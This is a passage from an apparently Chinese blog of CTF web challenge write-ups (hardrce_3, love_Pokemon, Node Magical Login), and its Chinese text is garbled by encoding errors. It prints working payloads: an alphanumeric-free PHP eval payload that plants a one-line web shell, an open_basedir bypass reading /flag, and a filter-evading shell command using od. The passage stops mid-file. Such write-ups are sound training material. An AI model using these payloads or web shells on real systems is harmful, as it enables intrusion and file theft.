title="[SWPUCTF 2021 æ–°ç”Ÿèµ›]hardrce_3"></a>[SWPUCTF 2021 æ–°ç”Ÿèµ›]hardrce_3</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;wllm&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$wllm</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;wllm&#x27;</span>];</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;\^&#x27;</span>,<span class="string">&#x27;\~&#x27;</span>,<span class="string">&#x27;\|&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$wllm</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;å°ä¼™å­åªä¼šå¼‚æˆ–å’Œå–åï¼Ÿä¸å¥½æ„æ€å“¦LTLTè¯´ä¸èƒ½ç”¨ï¼ï¼&quot;</span>);</span><br><span class="line">    &#125;&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z0-9]/is&#x27;</span>,<span class="variable">$wllm</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Ra&#x27;sAlGhulè¯´ç”¨å­—æ¯æ•°å­—æ˜¯æ²¡æœ‰çµé­‚çš„ï¼&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;NoVic4è¯´ï¼šä¸é”™å“¦å°ä¼™å­ï¼Œå¯ä½ èƒ½æ‹¿åˆ°flagå—ï¼Ÿ&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$wllm</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;è”¡æ€»è¯´ï¼šæ³¨æ„å®¡é¢˜ï¼ï¼ï¼&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æŒºç®€å•çš„ï¼Œè‡ªå¢å°±è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://node7.anna.nssctf.cn:29288/?wllm=%24%5F%3D%5B%5D%3B%24%5F%3D%40%22%24%5F%22%3B%24%5F%3D%24%5F%5B%27%21%27%3D%3D%27%40%27%5D%3B%24%5F%5F%5F%3D%24%5F%3B%24%5F%5F%3D%24%5F%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%5F%2E%3D%24%5F%5F%3B%24%5F%5F%5F%2E%3D%24%5F%5F%3B%24%5F%5F%3D%24%5F%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%5F%2E%3D%24%5F%5F%3B%24%5F%5F%3D%24%5F%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%5F%2E%3D%24%5F%5F%3B%24%5F%5F%3D%24%5F%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%5F%2E%3D%24%5F%5F%3B%24%5F%5F%5F%5F%3D%27%5F%27%3B%24%5F%5F%3D%24%5F%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%5F%5F%2E%3D%24%5F%5F%3B%24%5F%5F%3D%24%5F%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%5F%5F%2E%3D%24%5F%5F%3B%24%5F%5F%3D%24%5F%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%5F%5F%2E%3D%24%5F%5F%3B%24%5F%5F%3D%24%5F%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%5F%5F%2E%3D%24%5F%5F%3B%24%5F%3D%24%24%5F%5F%5F%5F%3B%24%5F%5F%5F%28%24%5F%5B%5F%5D%29%3B</span><br><span class="line">_=file_put_contents(&quot;1.php&quot;,&quot;&lt;?php eval(\$_POST[&#x27;cmd&#x27;]);?&gt;&quot;);</span><br></pre></td></tr></table></figure><p>å¾€1.phpä¸­å†™å…¥ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬ï¼Œå½“æ—¶systemæ‰§è¡Œä¸äº†ï¼Œçœ‹äº†ä¸‹phpinfo()å‘ç°banäº†å¥½å¤šå‡½æ•°ï¼Œfile_get_contentså’Œfile_put_contentsè¿˜åœ¨ï¼Œå…ˆå†™ä¸ªæ–¹ä¾¿ç‚¹çš„åé—¨ç„¶åçœ‹çœ‹ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=file_put_contents(&#x27;2.php&#x27;,&quot;&lt;?php print_r(ini_get(&#x27;open_basedir&#x27;).&#x27;&lt;br&gt;&#x27;);&quot;);</span><br></pre></td></tr></table></figure><p>å›æ˜¾å¦‚ä¸‹</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241206181457145.png" alt="image-20241206181457145"></p><p>è¢«é™åˆ¶åœ¨&#x2F;tmpç›®å½•ä¸‹ï¼Œæ¥ä¸‹æ¥è¿˜æ˜¯è¯•è¯•ç›´æ¥file_get_contentsèƒ½ä¸èƒ½è·å–åˆ°flag</p><p>ä¸è¡Œï¼Œå¥½çƒ¦å•Šè¿™ç§disable functionï¼Œç›´æ¥å“¥æ–¯æ‹‰ï¼ï¼ï¼é‡Œé¢ä¼šè‡ªåŠ¨ç»•è¿‡</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241206182342197.png" alt="image-20241206182342197"></p><p>ç‰›é€¼å“¥æ–¯æ‹‰ï¼</p><p>è¿™ç§æ–¹æ³•ä¹Ÿå¯ä»¥ï¼</p><p>ç»•è¿‡open_basedirçš„æ–¹æ³•ï¼ï¼ï¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=file_put_contents(&#x27;a.php&#x27;,&quot;&lt;?php print_r(ini_get(&#x27;open_basedir&#x27;).&#x27;&lt;br&gt;&#x27;); mkdir(&#x27;test&#x27;); chdir(&#x27;test&#x27;); ini_set(&#x27;open_basedir&#x27;,&#x27;..&#x27;); chdir(&#x27;..&#x27;); chdir(&#x27;..&#x27;); chdir(&#x27;..&#x27;); ini_set(&#x27;open_basedir&#x27;,&#x27;/&#x27;); echo file_get_contents(&#x27;/flag&#x27;); print(1);?&gt; &quot;);</span><br></pre></td></tr></table></figure><p>å…³é”®ä»£ç ä¸º</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ini_set(&#x27;open_basedir&#x27;,&#x27;..&#x27;);</span><br></pre></td></tr></table></figure><p>å°†é™åˆ¶è®¾ç½®ä¸ºå½“å‰ç›®å½•çš„çˆ¶ç›®å½•</p><p>ç»è¿‡ä¸‰æ¬¡chdirï¼Œè‡ªèº«å˜åˆ°äº†&#x2F;varï¼Œä½†æ˜¯æ­¤æ—¶open_basedirä¸ºå…¶çˆ¶ç›®å½•ï¼Œå› æ­¤å°±æ˜¯æ ¹ç›®å½•ï¼Œé‚£ä¹ˆå°±æ‹¿ä¸‹äº†ï¼</p><h2 id="å¹¿ä¸œå¼ºç½‘æ¯-2021-å›¢é˜Ÿç»„-love-Pokemon"><a href="#å¹¿ä¸œå¼ºç½‘æ¯-2021-å›¢é˜Ÿç»„-love-Pokemon" class="headerlink" title="[å¹¿ä¸œå¼ºç½‘æ¯ 2021 å›¢é˜Ÿç»„]love_Pokemon"></a>[å¹¿ä¸œå¼ºç½‘æ¯ 2021 å›¢é˜Ÿç»„]love_Pokemon</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&#x27;sandbox/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$dir</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">DefenderBonus</span>(<span class="params"><span class="variable">$Pokemon</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&#x27;| |_|\\$|;|l|s|flag|a|t|m|r|e|j|k|n|w|i|\\\\|p|h|u|v|\\+|\\^|\`|\~|\||\&quot;|\&lt;|\&gt;|\=|&#123;|&#125;|\!|\&amp;|\*|\?|\(|\)/i&quot;</span>,<span class="variable">$Pokemon</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;catch broken Pokemon! mew-_-two&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$Pokemon</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ghostpokemon</span>(<span class="params"><span class="variable">$Pokemon</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$Pokemon</span>))&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$Pokemon</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$pks</span>) &#123;</span><br><span class="line">            <span class="variable">$Pokemon</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">DefenderBonus</span>(<span class="variable">$pks</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$Pokemon</span> = <span class="title function_ invoke__">DefenderBonus</span>(<span class="variable">$Pokemon</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;myfavorite&#x27;</span>] ?? <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;picacu!&#x27;</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;picacu!&#x27;</span>).<span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;bulbasaur!&#x27;</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;miaowa!&#x27;</span>).<span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">        <span class="variable">$level</span> = <span class="variable">$_POST</span>[<span class="string">&quot;levelup&quot;</span>] ?? <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> ((!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/lv100/i&#x27;</span>,<span class="variable">$level</span>)) &amp;&amp; (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/lv100/i&#x27;</span>,<span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$level</span>))))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;./hint.php&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;squirtle&#x27;</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;jienijieni!&#x27;</span>).<span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;mewtwo&#x27;</span>:</span><br><span class="line">        <span class="variable">$dream</span> = <span class="variable">$_POST</span>[<span class="string">&quot;dream&quot;</span>] ?? <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$dream</span>)&gt;=<span class="number">20</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;So Big Pokenmon!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">ghostpokemon</span>(<span class="variable">$dream</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$dream</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>é¦–å…ˆæ˜¯å…³äºescapeshellargçš„è€ƒç‚¹ã€‚</p><pre><code>escapeshellarg çš„ä½œç”¨æ˜¯æŠŠå­—ç¬¦ä¸²è½¬ç ä¸ºå¯ä»¥åœ¨ shell å‘½ä»¤é‡Œä½¿ç”¨çš„å‚æ•°ã€‚ï¼ˆescapeshellarg å’Œ escapeshellcmd ç›¸ä¼¼ï¼Œä¸»è¦çœ‹æ˜¯å¦æœ‰å¼•å·ï¼‰é‚£ä¹ˆè¿™é‡Œå°±å¯ä»¥ä½¿ç”¨æ¼æ´ï¼šescapeshellarg()è¿™ä¸ªå‡½æ•°åœ¨å¤„ç†è¶…è¿‡ASCIIç èŒƒå›´çš„å­—ç¬¦çš„æ—¶å€™ä¼šç›´æ¥è¿‡æ»¤æ‰è¯¥å­—ç¬¦ä¸²</code></pre><p>é‚£ä¹ˆæˆ‘ä»¬ç›´æ¥æˆ‘ä»¬å¯ä»¥ç”¨%81å»ç»•è¿‡ï¼Œå› ä¸º%81ä¸ºä¸å¯è§å­—ç¬¦ï¼ˆå½“ç„¶è¿˜æœ‰å…¶ä»–çš„ï¼‰<br><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241207183625856.png" alt="image-20241207183625856"></p><p>è¯»å–åˆ°äº†hint.php</p><p>ç„¶åå°±æ˜¯å¯¹&#x2F;flagå†…å®¹çš„è¯»å–äº†ï¼</p><p>ä½†æ˜¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&#x27;| |_|\\$|;|l|s|flag|a|t|m|r|e|j|k|n|w|i|\\\\|p|h|u|v|\\+|\\^|\`|\~|\||\&quot;|\&lt;|\&gt;|\=|&#123;|&#125;|\!|\&amp;|\*|\?|\(|\)/i&quot;</span>,<span class="variable">$Pokemon</span>))&#123;</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤äº†ä¸€å †ï¼Œå…ˆçœ‹ç»•è¿‡ç©ºæ ¼è¿‡æ»¤</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/b64eaf07acb79400eb4758495127f5a9.png" alt="img"></p><p>ç„¶åæ˜¯è¯»å–çš„å‘½ä»¤ï¼Œè¿‡æ»¤äº†å¤ªå¤šå•¦ï¼ï¼odå¯ä»¥ç”¨ï¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">od%09/F[B-O][@-B]G</span><br></pre></td></tr></table></figure><p>ä¸­æ‹¬å·æ²¡æœ‰è¢«è¿‡æ»¤å’Œ-æ²¡æœ‰è¢«è¿‡æ»¤ï¼Œå¯ä»¥ç”¨æ­£åˆ™è¡¨è¾¾å¼ç»•è¿‡</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241207191631376.png" alt="image-20241207191631376"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">dump = <span class="string">&quot;0000000 051516 041523 043124 031573 034465 032544 062463 026467 0000020 032064 030543 032055 034460 026465 033071 031063 031455 0000040 063144 060467 031146 032545 063145 076471 000012 0000055&quot;</span></span><br><span class="line">octs = [(<span class="string">&quot;0o&quot;</span> + n) <span class="keyword">for</span> n <span class="keyword">in</span> dump.split(<span class="string">&quot; &quot;</span>) <span class="keyword">if</span> n]</span><br><span class="line">hexs = [<span class="built_in">int</span>(n, <span class="number">8</span>) <span class="keyword">for</span> n <span class="keyword">in</span> octs]</span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> hexs:</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">len</span>(<span class="built_in">hex</span>(n)) &gt; <span class="number">4</span>):</span><br><span class="line">        swapped = <span class="built_in">hex</span>(((n &lt;&lt; <span class="number">8</span>) | (n &gt;&gt; <span class="number">8</span>)) &amp; <span class="number">0xFFFF</span>)</span><br><span class="line">        result += swapped[<span class="number">2</span>:].zfill(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(result).decode())</span><br></pre></td></tr></table></figure><p>odè·å¾—çš„ç»“æœæ˜¯å…«è¿›åˆ¶å­—ç¬¦ä¸²ï¼Œè¿™é‡Œç»™å‡ºè§£ç è„šæœ¬</p><p>NSSCTF{359d53e7-44c1-4095-9632-3df7af2e5ef9}</p><h2 id="è¥¿æ¹–è®ºå‰‘-2022-Node-Magical-Login"><a href="#è¥¿æ¹–è®ºå‰‘-2022-Node-Magical-Login" class="headerlink" title="[è¥¿æ¹–è®ºå‰‘ 2022]Node Magical Login"></a>[è¥¿æ¹–è®ºå‰‘ 2022]Node Magical Login</h2><p>ç»™äº†æºç ï¼Œè¿™é“é¢˜ä¸»è¦çœ‹æºç å°±è¡Œ</p><p>main.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>)</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>)</span><br><span class="line"><span class="keyword">const</span> cookieParser = <span class="built_in">require</span>(<span class="string">&quot;cookie-parser&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> controller = <span class="built_in">require</span>(<span class="string">&quot;./controller&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PORT</span> = <span class="title class_">Number</span>(process.<span class="property">env</span>.<span class="property">PORT</span>) || <span class="number">80</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">HOST</span> = <span class="string">&#x27;0.0.0.0&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">urlencoded</span>(&#123;<span class="attr">extended</span>:<span class="literal">false</span>&#125;))</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cookieParser</span>())</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>())</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(<span class="string">&#x27;static&#x27;</span>))</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/login&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    controller.<span class="title class_">LoginController</span>(req,res)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/&quot;</span>,<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">sendFile</span>(__dirname,<span class="string">&quot;static/index.html&quot;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/flag1&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    controller.<span class="title class_">Flag1Controller</span>(req,res)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/flag2&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    controller.<span class="title class_">CheckInternalController</span>(req,res)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/getflag2&quot;</span>,<span class="function">(<span class="params">req,res</span>)=&gt;</span> &#123;</span><br><span class="line">    controller.<span class="title class_">CheckController</span>(req,res)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="variable constant_">PORT</span>,<span class="variable constant_">HOST</span>,<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Server is listening on Host <span class="subst">$&#123;HOST&#125;</span> Port <span class="subst">$&#123;PORT&#125;</span>.`</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>controller.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 